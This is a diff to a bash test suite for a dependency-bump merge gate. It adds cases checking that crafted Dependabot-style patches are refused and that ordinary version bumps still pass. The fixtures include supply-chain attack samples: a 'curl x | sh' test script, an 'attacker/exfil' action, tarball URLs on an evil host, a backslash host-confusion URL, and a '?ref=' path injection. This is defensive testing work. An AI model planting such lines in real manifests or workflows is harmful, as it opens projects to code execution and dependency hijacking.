@@ -3718,6 +3718,58 @@ grep -q '"verdict": "refused"' <<<"$vout" \
     && ok "a Dockerfile line that is not a base image pin is refused" \
     || bad "an added RUN rode along with a base image bump"
 
+# The other arms, as the second review found them: each kept its own line
+# grammar and never asked whether the line still named the same thing.
+arm_refused() {  # $1 = label, $2 = reason text, $3 = path, rest = hunk lines
+    local label="$1" why="$2" path="$3"; shift 3
+    printf '%s\n' "diff --git a/$path b/$path" "--- a/$path" "+++ b/$path" '@@ -1,9 +1,9 @@' "$@" > "$dp/arm.patch"
+    vout="$(timeout 20 python3 "$cdb" < "$dp/arm.patch" 2>&1)"
+    grep -q '"verdict": "refused"' <<<"$vout" && grep -q -- "$why" <<<"$vout" \
+        && ok "$label is refused" \
+        || bad "$label passed or was refused for another reason: $(tr -d '\n' <<<"$vout" | cut -c1-160)"
+}
+dg0=93ce27a88655056a51dbdd8f5f2d7ddc071c7b0070fb288a37b5a285fc83971e; dg1=9a73a5088750b4c95158ab26629c854c3d6fc4b173cb7bc8079ad252d8ed7bfa
+wf_sha_a=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa; wf_sha_b=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+arm_refused "a pin moved to another action" 'not the action' .github/workflows/ci.yml \
+    "-      - uses: actions/checkout@$wf_sha_a # v4.1.0" "+      - uses: attacker/checkout@$wf_sha_b # v4.1.0"
+arm_refused "a new action step" 'not the action' .github/workflows/ci.yml \
+    "+      - uses: attacker/exfil@$wf_sha_b # v1.0.0"
+arm_refused "a resolved URL whose host hides behind a backslash" 'registry.npmjs.org' package-lock.json \
+    '-      "resolved": "https://registry.npmjs.org/x/-/x-1.0.0.tgz",' \
+    '+      "resolved": "https://evil.example\\@registry.npmjs.org/x/-/x-1.0.1.tgz",'
+for spec in 'https://evil.example/left-pad-1.0.0.tgz' 'github:attacker/left-pad#main' 'npm:evil-left-pad@^1.0.0'; do
+    arm_refused "a package.json range replaced by $spec" 'set to a version range' package.json \
+        '-    "left-pad": "^1.0.0"' "+    \"left-pad\": \"$spec\""
+done
+arm_refused "a package.json line that is not a dependency" 'set to a version range' package.json \
+    '+  "main": "./evil.js",'
+arm_refused "a package.json script rewritten under the same key" 'not a dependency set to a version range' package.json \
+    '-    "test": "jest",' '+    "test": "curl x | sh",'
+arm_refused "a new package.json dependency" 'already had' package.json \
+    '+    "evil-dep": "1.0.0",'
+arm_refused "a package.json range moved to a dist-tag" 'not a dependency set to a version range' package.json \
+    '-    "left-pad": "^1.0.0"' '+    "left-pad": "evil"'
+arm_refused "a Cargo.toml git source moved" 'not a version' Cargo.toml \
+    '-foo = { git = "https://github.com/good/foo", tag = "v1.0.0" }' \
+    '+foo = { git = "https://evil.example/foo", tag = "v1.0.0" }'
+arm_refused "a Cargo.toml package rename" 'not a version' Cargo.toml \
+    '-bar = { version = "1.0", package = "bar" }' '+bar = { version = "1.0", package = "evil-bar" }'
+arm_refused "a Dockerfile stage renamed and a stage added" 'stage' Dockerfile \
+    "-FROM python:3.12@sha256:$dg0 AS build" "+FROM python:3.12@sha256:$dg1 AS final" \
+    "+FROM python:3.12@sha256:$dg1 AS extra"
+# And the ordinary bump in each arm still passes.
+arm_bump() {  # $1 = label, $2 = path, rest = hunk lines
+    local label="$1" path="$2"; shift 2
+    printf '%s\n' "diff --git a/$path b/$path" "--- a/$path" "+++ b/$path" '@@ -1,9 +1,9 @@' "$@" > "$dp/arm.patch"
+    vout="$(timeout 20 python3 "$cdb" < "$dp/arm.patch" 2>&1)"
+    grep -q '"verdict": "dependency-bump"' <<<"$vout" && ok "$label still classifies as a bump" \
+        || bad "$label is now refused: $(tr -d '\n' <<<"$vout" | cut -c1-160)"
+}
+arm_bump "a package.json range bump" package.json '-    "left-pad": "^1.0.0",' '+    "left-pad": "^1.3.0",'
+arm_bump "a package.json OR range with a prerelease" package.json '-    "x": ">=1.0.0 || 2.0.0-beta.1",' '+    "x": ">=1.2.0 || 2.0.0-beta.2",'
+arm_bump "a Cargo.toml version bump" Cargo.toml '-serde = { version = "1.0.200", features = ["derive"] }' '+serde = { version = "1.0.210", features = ["derive"] }'
+arm_bump "a Dockerfile digest bump in a named stage" Dockerfile "-FROM python:3.12@sha256:$dg0 AS build" "+FROM python:3.12@sha256:$dg1 AS build"
+
 # pip, as Dependabot writes it for a hash-pinned requirements file. sysknife
 # added a pip ecosystem for tools/ci-python on 2026-10-29, and its first bump
 # (sysknife#735, PyYAML 6.0.2 -> 6.0.3) was refused as "not dependency
@@ -4006,6 +4058,10 @@ dep_gate() {  # $1 = patch file, $2 = the commit GitHub says the tag is, or the 
       *'pr diff'*) cat '$1' ;;
       *'/git/ref/tags/'*'.ref'*) printf 'refs/tags/%s\tcommit\t%s\n' \"\${2#*/git/ref/tags/}\" '$2' ;;
       *'/git/ref/heads/'*'.ref'*) printf 'refs/heads/%s\n' \"\${2#*/git/ref/heads/}\" ;;
+      *baseRefName*) echo main ;;
+      *'/compare/'*'merge_base'*|*'merge_base'*'/compare/'*) echo $dep_mb ;;
+      *'/contents/'*'ref=$dep_mb'*) cat \"\$DEP_BASE\" ;;
+      *'/contents/'*) cat \"\$DEP_HEAD\" ;;
       *'api repos/'*) echo '$2' ;;
     esac"
     PATH="$stub_dir:$PATH" MAINTAINER_STATE="$dep_state" MAINTAINER_ACCOUNT=testuser \
@@ -4013,8 +4069,25 @@ dep_gate() {  # $1 = patch file, $2 = the commit GitHub says the tag is, or the 
         MAINTAINER_SCRIPTS="${DEP_SCRIPTS:-$root/scripts}" \
         MAINTAINER_IMAGE_RESOLVER="${DEP_RESOLVER:-$root/scripts/resolve_image_digest.py}" \
         MAINTAINER_PYPI_VERIFIER="${DEP_PYPI:-$root/scripts/verify_pypi_release.py}" \
+        MAINTAINER_PIP_FILES_VERIFIER="$root/scripts/verify_pip_files.py" \
+        DEP_BASE="${DEP_BASE:-$dp/pip-base.txt}" DEP_HEAD="${DEP_HEAD:-$dp/pip-head.txt}" \
         bash "$root/bin/maintainer-merge" verify-deps 9 cafe1234cafe1234 2>&1
 }
+# The merge base GitHub reports, and the requirements file on both sides of
+# pip.patch, read whole: verify-deps asks for both and checks they tell the same
+# story as the diff.
+dep_mb=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+pip_whole() {  # $1 = PyYAML version, $2 $3 = its two hashes
+    printf '%s\n' 'pathspec==1.1.1 \' \
+        '    --hash=sha256:17db5ecd524104a120e173814c90367a96a98d07c45b2e10c2f3919fff91bf5a \' \
+        '    --hash=sha256:a00ce642f577bf7f473932318056212bc4f8bfdf53128c78bbd5af0b9b20b189' \
+        "PyYAML==$1 \\" "    --hash=sha256:$2 \\" "    --hash=sha256:$3" \
+        'yamllint==1.38.0 \' '    --hash=sha256:cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc'
+}
+pip_whole 6.0.2 01179a4a8559ab5de078078f37e5c1a30d76bb88519906844fd7bdea1b7729ff \
+    0833f8694549e586547b576dcfaba4a6b55b9e96098b36cdc7ebefe667dfed48 > "$dp/pip-base.txt"
+pip_whole 6.0.3 00c4bdeba853cc34e7dd471f16b4114f4162dc03e6b7afcc2128711f0eca823c \
+    0150219816b6a1fa26fb4699fb7daa9caf09eb1999f3b70fb6e786805e80375a > "$dp/pip-head.txt"
 
 # A resolver that answers without a network, so the suite stays offline. $1 is
 # what the registry is pretending to say; empty means it could not be reached.
@@ -4145,6 +4218,123 @@ else
     bad "a hash PyPI does not publish earned a receipt (rc=$drc)"
 fi
 unset DEP_PYPI
+
+# The diff and the files read whole must tell the same story. A head file whose
+# PyYAML block carries a third hash, which the diff never showed, is a bump the
+# two readings describe differently.
+pip_whole 6.0.3 00c4bdeba853cc34e7dd471f16b4114f4162dc03e6b7afcc2128711f0eca823c \
+    0150219816b6a1fa26fb4699fb7daa9caf09eb1999f3b70fb6e786805e80375a \
+    | sed 's/^\(    --hash=sha256:0150219816b6a1fa26fb4699fb7daa9caf09eb1999f3b70fb6e786805e80375a\)$/\1 \\\n    --hash=sha256:dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd/' > "$dp/pip-head-extra.txt"
+export DEP_HEAD="$dp/pip-head-extra.txt"
+dout="$(DEP_PYPI="$(fake_pypi ok)" dep_gate "$dp/pip.patch" unused)"; drc=$?
+unset DEP_HEAD
+if [ "$drc" != 0 ] && grep -q 'disagree about' <<<"$dout" && [ ! -f "$dep_state/receipts/9.json" ]; then
+    ok "a head file holding a hash the diff did not show refuses the receipt"
+else
+    bad "the gate receipted a pip bump whose whole file disagrees with the diff (rc=$drc): $(tr -d '\n' <<<"$dout" | cut -c1-160)"
+fi
+# The join the review used: the last hash line ends in a backslash and swallows
+# the unchanged `--index-url` line below it. Read whole, the head file has an
+# option line, and that is refused before anything is compared.
+{ printf '%s\n' '--index-url https://corp.example/simple'; cat "$dp/pip-base.txt"; } > "$dp/pip-base-index.txt"
+{ printf '%s\n' '--index-url https://corp.example/simple'; cat "$dp/pip-head.txt"; } > "$dp/pip-head-index.txt"
+export DEP_BASE="$dp/pip-base-index.txt" DEP_HEAD="$dp/pip-head-index.txt"
+dout="$(DEP_PYPI="$(fake_pypi ok)" dep_gate "$dp/pip.patch" unused)"; drc=$?
+unset DEP_BASE DEP_HEAD
+if [ "$drc" != 0 ] && grep -q 'read whole the way pip reads it' <<<"$dout" && grep -q 'option line' <<<"$dout" \
+   && [ ! -f "$dep_state/receipts/9.json" ]; then
+    ok "a requirements file with an index option, read whole, refuses the receipt"
+else
+    bad "a requirements file with an index option earned a receipt (rc=$drc): $(tr -d '\n' <<<"$dout" | cut -c1-160)"
+fi
+
+# The whole-file reading on its own, one case per family the review found.
+vpf="$root/scripts/verify_pip_files.py"
+fake_scripts_pip_path="$stub_dir/pathscripts"; mkdir -p "$fake_scripts_pip_path"
+vpf_case() {  # $1 = label, $2 = expected rc, $3 = text the output must hold; base and head on fd from files
+    local label="$1" want="$2" text="$3" out rc=0
+    out="$(timeout 20 python3 "$vpf" "$dp/vpf-base.txt" "$dp/vpf-head.txt" 2>&1)" || rc=$?
+    if [ "$rc" = "$want" ] && grep -q -- "$text" <<<"$out"; then
+        ok "verify_pip_files: $label"
+    else
+        bad "verify_pip_files: $label (rc=$rc, want $want): $(tr -d '\n' <<<"$out" | cut -c1-160)"
+    fi
+}
+cp "$dp/pip-base.txt" "$dp/vpf-base.txt"; cp "$dp/pip-head.txt" "$dp/vpf-head.txt"
+vpf_case "a real bump lists the one pin that moved, with its hashes" 0 '"name": "PyYAML", "version": "6.0.3"'
+{ printf '# -*- coding: latin-1 -*-\n'; cat "$dp/pip-head.txt"; } > "$dp/vpf-head.txt"
+vpf_case "an encoding cookie is refused" 1 'encoding cookie'
+printf 'PyYAML==6.0.3 \\\n    --hash=sha256:%s\n\xc5\x85\n' "$h1" > "$dp/vpf-head.txt"
+vpf_case "a byte outside printable ASCII is refused" 1 'only printable'
+sed 's/^\(    --hash=sha256:0150219816b6a1fa26fb4699fb7daa9caf09eb1999f3b70fb6e786805e80375a\)$/\1 \\/' "$dp/pip-head.txt" > "$dp/vpf-head.txt"
+vpf_case "a trailing backslash that joins the next pin is read as pip reads it" 1 'not a pinned requirement\|option other than'
+python3 - "$dp/pip-head.txt" "$dp/vpf-head.txt" <<'PYEOF2'
+import sys
+lines = open(sys.argv[1]).read().split("\n")
+i = lines.index("PyYAML==6.0.3 \\")
+open(sys.argv[2], "w").write("\n".join(lines[:i] + ["PyYAML==6.0.3"] + lines[i + 3:]))
+PYEOF2
+vpf_case "a pin that drops its hashes is refused" 1 'lost its hashes'
+sed 's/^PyYAML==6.0.3 \\$/PyYAML==6.0.3 ; sys_platform == "linux" \\/' "$dp/pip-head.txt" > "$dp/vpf-head.txt"
+vpf_case "a marker change is refused" 1 "marker changed"
+{ cat "$dp/pip-head.txt"; printf 'evilpkg==1.0 \\\n    --hash=sha256:%s\n' "$h1"; } > "$dp/vpf-head.txt"
+vpf_case "a new package is refused" 1 'different packages'
+{ cat "$dp/pip-base.txt"; printf 'pyyaml==6.0.2 \\\n    --hash=sha256:%s\n' "$h1"; } > "$dp/vpf-base.txt"; cp "$dp/pip-head.txt" "$dp/vpf-head.txt"
+vpf_case "a package pinned twice is refused" 1 'twice'
+cp "$dp/pip-base.txt" "$dp/vpf-base.txt"
+sed "s/^\(yamllint==1.38.0 \\\\\)$/\1/; s/cccccccc/eeeeeeee/" "$dp/pip-head.txt" > "$dp/vpf-head.txt"
+sed -i 's/^yamllint==1.38.0$/yamllint==1.38.0 \\/' "$dp/vpf-head.txt"
+vpf_case "a hash swapped under an unchanged version is refused" 1 'stays at'
+pip_whole 5.3 "$h0" "$h1" > "$dp/vpf-head.txt"
+vpf_case "a downgrade is refused" 1 'not shown to be an upgrade'
+cp "$dp/pip-base.txt" "$dp/vpf-head.txt"
+vpf_case "two identical files are not a bump" 1 'no pinned version moved'
+
+# A requirements path goes into a contents API URL, so `?ref=` in it would ask
+# for some other commit's file. The classifier here names one.
+cat > "$fake_scripts_pip_path/classify_dependency_bump.py" <<'STUB'
+import json, sys
+sys.stdin.read()
+p = "x?ref=deadbeef/requirements.txt"
+json.dump({"verdict": "dependency-bump", "files": {p: "pip-requirements"}, "changed_lines": 4,
+           "pins": [], "images": [], "pip": [{"path": p, "name": "PyYAML", "version": "6.0.3",
+           "hashes": ["%s" % ("a" * 64)]}]}, sys.stdout)
+STUB
+dout="$(DEP_SCRIPTS="$fake_scripts_pip_path" DEP_PYPI="$(fake_pypi ok)" dep_gate "$dp/pip.patch" unused)"; drc=$?
+if [ "$drc" != 0 ] && grep -q 'not a plain path' <<<"$dout" && [ ! -f "$dep_state/receipts/9.json" ]; then
+    ok "a requirements path that would carry ?ref= into the API URL is refused"
+else
+    bad "a requirements path with ?ref= was put in a URL (rc=$drc): $(tr -d '\n' <<<"$dout" | cut -c1-160)"
+fi
+
+# parse() itself: a hunk whose header undercounts would drop every line after it.
+cat > "$dp/undercount.patch" <<PATCH
+diff --git a/requirements.txt b/requirements.txt
+--- a/requirements.txt
++++ b/requirements.txt
+@@ -1,1 +1,1 @@
+-PyYAML==6.0.2 \\
++PyYAML==6.0.3 \\
++-e git+https://example.invalid/x.git#egg=x
+PATCH
+vout="$(dep_case "$dp/undercount.patch")"
+grep -q '"verdict": "refused"' <<<"$vout" && grep -q 'outside any hunk' <<<"$vout" \
+    && ok "a line past the hunk's declared counts is refused, not dropped" \
+    || bad "a line past the hunk's counts was dropped: $(tr -d '\n' <<<"$vout" | cut -c1-160)"
+cat > "$dp/lock-anyline.patch" <<'PATCH'
+diff --git a/Cargo.lock b/Cargo.lock
+--- a/Cargo.lock
++++ b/Cargo.lock
+@@ -126,2 +126,3 @@
+ name = "async-openai"
+-version = "0.41.3"
++version = "0.42.0"
++[patch.unused]
+PATCH
+vout="$(dep_case "$dp/lock-anyline.patch")"
+grep -q '"verdict": "refused"' <<<"$vout" && grep -q 'not package metadata' <<<"$vout" \
+    && ok "a Cargo.lock line that is not package metadata is refused" \
+    || bad "an arbitrary Cargo.lock line passed: $(tr -d '\n' <<<"$vout" | cut -c1-160)"
 
 # The real checker, offline: MAINTAINER_PYPI_URL points it at a file:// tree
 # shaped like https://pypi.org/pypi/<name>/<version>/json.
@@ -9873,6 +10063,13 @@ grep -q 'identity: app/dependabot, branch in o/r' <<<"$out" && grep -q 'ecosyste
     && ok "the block states the identity it checked and the ecosystem" || bad "no identity or ecosystem line: $out"
 dreset; dpr 691 merge=BLOCKED
 check "BLOCKED is a missing approval, which verify then gives" "$(next_of "$(deps_run -- 691)" 691)" "verify"
+# The classifier reads text an author wrote, so deps bounds it as verify-deps does.
+slow_scripts="$stub_dir/slowscripts"; mkdir -p "$slow_scripts"
+printf 'import time\ntime.sleep(30)\n' > "$slow_scripts/classify_dependency_bump.py"
+out="$(deps_run MAINTAINER_SCRIPTS="$slow_scripts" MAINTAINER_CLASSIFY_TIMEOUT=1 -- 691)"
+grep -q 'ran past 1s' <<<"$out" \
+    && ok "deps stops a classifier that runs out of time and says so" \
+    || bad "deps did not bound the classifier: $(tr -d '\n' <<<"$out" | cut -c1-160)"
 
 # The branch is behind: ask for a rebase, once.
 dreset; dpr 690 merge=BEHIND
